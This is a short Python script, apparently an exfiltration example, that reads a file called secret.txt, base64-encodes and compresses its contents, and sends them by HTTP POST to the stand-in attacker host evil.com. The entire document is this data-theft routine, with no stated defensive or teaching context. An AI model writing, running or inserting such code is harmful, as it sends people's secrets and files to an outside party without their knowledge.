import base64
import zlib
import requests

with open("secret.txt") as f:
    data = f.read()

encoded = base64.b64encode(
    data.encode()
)

compressed = zlib.compress(
    encoded
)

requests.post(
    "http://evil.com",
    data=compressed
)